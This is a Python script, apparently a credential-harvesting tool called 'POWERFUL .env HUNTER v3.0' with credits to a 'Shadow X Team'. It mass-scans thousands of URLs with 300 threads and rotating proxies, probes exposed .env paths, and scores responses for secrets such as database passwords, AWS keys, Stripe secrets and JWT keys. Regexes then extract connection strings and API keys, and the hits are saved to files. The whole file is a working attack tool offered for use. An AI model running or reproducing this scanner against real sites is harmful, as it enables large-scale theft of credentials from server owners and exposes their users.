import requests
import threading
import queue
import time
import random
import json
import re
import urllib3
import warnings
from urllib.parse import urlparse
from colorama import init, Fore, Style

# DISABLE ALL WARNINGS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
init(autoreset=True)

# ================== POWER CONFIGURATION ==================
INPUT_FILE    = "urls.txt"
OUTPUT_FILE   = "REAL_ENV.txt"
THREADS       = 300
TIMEOUT       = 10
RETRIES       = 2
DELAY         = 0.1
MAX_URLS      = 10000

# Proxy Configuration
PROXY_LIST    = None
ROTATE_PROXY  = False
# =========================================================

# ASCII ART BANNER
ASCII_BANNER = f"""
{Fore.MAGENTA}
▓█████▄  █    ██  ▄▄▄▄    ██▓     ██▓ ▄▄▄▄    ██▓▓█████▄  ▒█████  
▒██▀ ██▌ ██  ▓██▒▓█████▄ ▓██▒    ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▒██▒  ██▒
░██   █▌▓██  ▒██░▒██▒ ▄██▒██░    ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██░  ██▒
░▓█▄   ▌▓▓█  ░██░▒██░█▀  ▒██░    ░██░▒██░█▀  ░██░░▓█▄   ▌▒██   ██░
░▒████▓ ▒▒█████▓ ░▓█  ▀█▓░██████▒░██░░▓█  ▀█▓░██░░▒████▓ ░ ████▓▒░
 ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ░▒▓███▀▒░ ▒░▓  ░░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░ ▒░▒░▒░ 
 ░ ▒  ▒ ░░▒░ ░ ░ ▒░▒   ░ ░ ░ ▒  ░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒   ░ ▒ ▒░ 
 ░ ░  ░  ░░░ ░ ░  ░    ░   ░ ░    ▒ ░ ░    ░  ▒ ░ ░ ░  ░ ░ ░ ░ ▒  
   ░       ░      ░          ░  ░ ░   ░       ░     ░        ░ ░  
 ░                     ░                 ░           ░             
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         🚀 POWERFUL .env HUNTER v3.0 🚀                     ║
║                     Advanced Security Scanner - No Warnings                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# CREDITS
CREDITS = f"""
{Fore.YELLOW}
╔══════════════════════════════════════════════════════════════════════════════╗
║                              🔥 CREDITS & TEAM 🔥                           ║
║                                                                              ║
║    {Fore.CYAN}👑 Developer : {Fore.GREEN}Tayo Ling{Fore.YELLOW}                                        ║
║    {Fore.CYAN}📱 Telegram  : {Fore.GREEN}@irfacyber{Fore.YELLOW}                                        ║  
║    {Fore.CYAN}🎯 Powered by: {Fore.RED}Shadow X Team{Fore.YELLOW}                                      ║
║                                                                              ║
║    {Fore.WHITE}「 BUAT YANG HOBINYA COPAS, MINTA IZIN DULU BANG! 」{Fore.YELLOW}            ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# EXTENDED PATH DICTIONARY WITH WEIGHTS
PATH_DICT = {
    "/.env": 3, "/.env.local": 3, "/.env.production": 3, 
    "/laravel/.env": 3, "/app/.env": 3, "/config/.env": 3,
    "/.env.backup": 2, "/.env.old": 2, "/.env.save": 2,
    "/api/.env": 2, "/admin/.env": 2, "/web/.env": 2,
    "/.env.example": 1, "/.env.sample": 1, "/.env.testing": 1,
    "/public/.env": 1, "/src/.env": 1, "/core/.env": 1,
}

# PRIORITY KEYWORDS WITH SCORING
KEYWORD_SCORES = {
    "DB_PASSWORD": 5, "AWS_SECRET_ACCESS_KEY": 5, "STRIPE_SECRET": 5,
    "MAIL_PASSWORD": 5, "FACEBOOK_APP_SECRET": 5, "GOOGLE_CLIENT_SECRET": 5,
    "APP_KEY": 4, "SECRET_KEY": 4, "ENCRYPTION_KEY": 4,
    "DATABASE_URL": 4, "REDIS_PASSWORD": 4, "JWT_SECRET": 4,
    "DB_USERNAME": 3, "DB_HOST": 3, "AWS_ACCESS_KEY_ID": 3,
    "STRIPE_KEY": 3, "PAYPAL_SECRET": 3, "GITHUB_TOKEN": 3,
    "APP_ENV": 2, "DB_NAME": 2, "DB_DATABASE": 2,
    "MAIL_USERNAME": 2, "APP_DEBUG": 2, "APP_URL": 2,
}

# ADVANCED BLOCKLIST PATTERNS
BLOCKLIST = [
    r"<\s*html[^>]*>", r"<\s*!DOCTYPE", r"<\s*head[^>]*>", r"<\s*body[^>]*>",
    r"<\s*title[^>]*>", r"<\s*script[^>]*>", r"<\s*meta[^>]*>",
    "not found", "forbidden", "unauthorized", "login", "sign in", 
    "captcha", "cloudflare", "index of", "directory listing",
    "error", "404", "500", "access denied", "page not found",
    "under maintenance", "website disabled", "bot protection"
]

q = queue.Queue()
stats = {
    'found': 0,
    'scanned': 0,
    'errors': 0,
    'start_time': time.time()
}
lock = threading.Lock()
proxies_list = []
current_proxy_index = 0

class Color:
    SUCCESS = Fore.GREEN
    WARNING = Fore.YELLOW
    ERROR = Fore.RED
    INFO = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    BLUE = Fore.BLUE
    ORANGE = Fore.LIGHTYELLOW_EX
    CYAN = Fore.CYAN

class Scanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        })

    def load_proxies(self):
        global proxies_list
        if PROXY_LIST:
            try:
                with open(PROXY_LIST, "r") as f:
                    raw_proxies = [line.strip() for line in f if line.strip()]
                for proxy in raw_proxies:
                    if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', proxy):
                        proxies_list.append(proxy)
                print(f"{Color.INFO}[+] Loaded {len(proxies_list)} valid proxies")
            except Exception as e:
                print(f"{Color.WARNING}[-] Proxy load failed: {e}")

    def get_proxy(self):
        if not proxies_list:
            return None
        global current_proxy_index
        if ROTATE_PROXY:
            proxy = proxies_list[current_proxy_index]
            current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        else:
            proxy = random.choice(proxies_list)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def calculate_env_score(self, text):
        text_upper = text.upper()
        score = 0
        matched_keywords = []
        
        for keyword, points in KEYWORD_SCORES.items():
            if keyword.upper() in text_upper:
                score += points
                matched_keywords.append(keyword)
        
        env_lines = [line for line in text.split('\n') if '=' in line and not line.strip().startswith('#')]
        total_lines = max(1, len(text.split('\n')))
        env_density = len(env_lines) / total_lines
        
        if env_density > 0.5: score += 5
        elif env_density > 0.3: score += 3
        elif env_density > 0.1: score += 1
        
        if re.search(r'^[A-Z_][A-Z0-9_]*=', text, re.MULTILINE): score += 2
        if re.search(r'=[\'\"].*[\'\"]', text): score += 1
        
        return score, matched_keywords, env_density

    def is_valid_env_content(self, text, url):
        text_lower = text.lower()
        
        for pattern in BLOCKLIST:
            if re.search(pattern, text_lower, re.IGNORECASE):
                return False, "Blocklisted pattern"
        
        if len(text) < 30: return False, "Content too short"
        if len(text) > 50000: return False, "Content too long"
        
        html_indicators = ["<html", "<!doctype", "<head", "<body", "<title>"]
        if any(indicator in text_lower[:500] for indicator in html_indicators):
            return False, "HTML content detected"
        
        return True, "Valid content"

    def extract_sensitive_data(self, text):
        sensitive_data = {
            "databases": [], "api_keys": [], "secrets": [],
            "urls": [], "emails": [], "ips": []
        }
        
        db_patterns = {
            "mysql": r"mysql://([^:\s]+):([^@\s]+)@([^:\s]+):(\d+)/([^\s]+)",
            "postgres": r"postgres(ql)?://([^:\s]+):([^@\s]+)@([^:\s]+):(\d+)/([^\s]+)",
            "mongodb": r"mongodb://([^:\s]+):([^@\s]+)@([^:\s]+):(\d+)/([^\s]+)",
            "redis": r"redis://([^:\s]+):([^@\s]+)@([^:\s]+):(\d+)",
        }
        
        for db_type, pattern in db_patterns.items():
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                sensitive_data["databases"].append({
                    "type": db_type, "connection_string": match.group(0),
                    "username": match.group(1) if match.groups() else "N/A",
                    "password": match.group(2) if match.groups() else "N/A",
                    "host": match.group(3) if match.groups() else "N/A",
                })
        
        secrets_patterns = {
            "aws_key": r'AWS_ACCESS_KEY_ID[\s=]+([^\s"\']+)',
            "aws_secret": r'AWS_SECRET_ACCESS_KEY[\s=]+([^\s"\']+)',
            "stripe_secret": r'STRIPE_SECRET[\s=]+([^\s"\']+)',
            "stripe_key": r'STRIPE_KEY[\s=]+([^\s"\']+)',
            "app_key": r'APP_KEY[\s=]+([^\s"\']+)',
            "mail_password": r'MAIL_PASSWORD[\s=]+([^\s"\']+)',
        }
        
        for key_type, pattern in secrets_patterns.items():
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                sensitive_data["api_keys"].append({
                    "type": key_type.upper(), "value": match.group(1)
                })
        
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text)
        sensitive_data["emails"] = emails
        
        return sensitive_data

    def scan_url(self, base_url):
        results = []
        sorted_paths = sorted(PATH_DICT.items(), key=lambda x: x[1], reverse=True)
        
        for path, weight in sorted_paths:
            url = base_url + path
            
            for attempt in range(RETRIES + 1):
                try:
                    proxies = self.get_proxy()
                    response = self.session.get(url, timeout=TIMEOUT, proxies=proxies, allow_redirects=True)
                    
                    if response.status_code == 200:
                        content = response.text
                        is_valid, reason = self.is_valid_env_content(content, url)
                        if not is_valid: continue
                        
                        score, matched_keywords, density = self.calculate_env_score(content)
                        if score >= 6:
                            sensitive_data = self.extract_sensitive_data(content)
                            result = {
                                "url": url, "score": score, "keywords": matched_keywords,
                                "density": density, "sensitive_data": sensitive_data,
                                "content_preview": content[:500] + "..." if len(content) > 500 else content
                            }
                            results.append(result)
                            break
                    
                    time.sleep(DELAY)
                    
                except Exception:
                    if attempt < RETRIES: time.sleep(1); continue
                    break
        
        return results

def worker():
    scanner = Scanner()
    while True:
        try: base_url = q.get_nowait().strip().rstrip("/")
        except: break

        try:
            results = scanner.scan_url(base_url)
            with lock:
                stats['scanned'] += 1
                for result in results:
                    stats['found'] += 1
                    
                    if result['score'] >= 10: color, level = Color.SUCCESS, "CRITICAL"
                    elif result['score'] >= 7: color, level = Color.ORANGE, "HIGH"
                    else: color, level = Color.WARNING, "MEDIUM"
                    
                    print(f"{Color.MAGENTA}[{level} #{stats['found']}]{color} {result['url']}")
                    print(f"    Score: {result['score']} | Keywords: {', '.join(result['keywords'][:5])}")
                    print(f"    Density: {result['density']:.2f} | Sensitive: {len(result['sensitive_data']['databases'])} DBs")
                    
                    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                        f.write(f"{result['url']}\n")
                    
                    with open("FULL_ENV.txt", "a", encoding="utf-8") as f:
                        f.write(f"\n{'='*80}\nURL: {result['url']}\nSCORE: {result['score']}\n")
                        f.write(f"KEYWORDS: {result['keywords']}\n{'='*80}\n{result['content_preview']}\n")
                        
        except Exception:
            with lock: stats['errors'] += 1
        q.task_done()

def print_config():
    config_display = f"""
{Fore.CYAN}
┌─────────────────────── {Fore.MAGENTA}CONFIGURATION{Fore.CYAN} ───────────────────────┐
│                                                               │
│    {Fore.WHITE}📁 Input File    : {Fore.GREEN}{INPUT_FILE:40} {Fore.CYAN}│
│    {Fore.WHITE}💾 Output File   : {Fore.GREEN}{OUTPUT_FILE:40} {Fore.CYAN}│  
│    {Fore.WHITE}⚡ Threads       : {Fore.GREEN}{THREADS:<40} {Fore.CYAN}│
│    {Fore.WHITE}⏱️  Timeout       : {Fore.GREEN}{TIMEOUT}s{Fore.CYAN}                                      │
│    {Fore.WHITE}🔄 Retries       : {Fore.GREEN}{RETRIES:<40} {Fore.CYAN}│
│    {Fore.WHITE}🛡️  Safety Limit  : {Fore.GREEN}{MAX_URLS:<40} {Fore.CYAN}│
│                                                               │
└───────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}
"""
    print(config_display)

def load_urls():
    try:
        with open(INPUT_FILE, "r", encoding="utf-8", errors="ignore") as f:
            urls = list(set(line.strip() for line in f if line.strip().startswith(('http://', 'https://'))))[:MAX_URLS]
        print(f"{Color.INFO}[+] Loaded {len(urls)} unique URLs")
        return urls
    except FileNotFoundError:
        print(f"{Color.ERROR}[-] Error: Input file '{INPUT_FILE}' not found!")
        exit(1)

def main():
    print(ASCII_BANNER)
    print(CREDITS)
    print_config()
    
    urls = load_urls()
    if not urls:
        print(f"{Color.ERROR}[-] No valid URLs found!")
        return
    
    for url in urls: q.put(url)
    
    print(f"{Color.INFO}[+] Starting {THREADS} threads...")
    start_time = time.time()
    
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
    
    try:
        last_update = 0
        while not q.empty():
            time.sleep(2)
            elapsed = time.time() - start_time
            scanned, found, errors = stats['scanned'], stats['found'], stats['errors']
            progress = (scanned / len(urls)) * 100 if urls else 0
            speed = scanned / elapsed if elapsed > 0 else 0
            
            if time.time() - last_update >= 2:
                print(f"{Color.BLUE}[Progress] {scanned}/{len(urls)} ({progress:.1f}%) | Found: {found} | Speed: {speed:.1f} URL/s", end="\r")
                last_update = time.time()
                
    except KeyboardInterrupt:
        print(f"\n{Color.WARNING}[!] Scan interrupted!")
    
    total_time = time.time() - start_time
    print(f"\n{Color.SUCCESS}[🎉] SCAN COMPLETED!")
    print(f"{Color.INFO}[📊] Total: {len(urls)} | Scanned: {stats['scanned']} | Found: {stats['found']}")
    print(f"{Color.INFO}[⏱️] Duration: {total_time:.2f}s | Speed: {stats['scanned']/total_time:.2f} URL/s")
    print(f"{Color.INFO}[💾] Results: {OUTPUT_FILE}, FULL_ENV.txt, SENSITIVE_DATA.json")

if __name__ == "__main__":
    main()
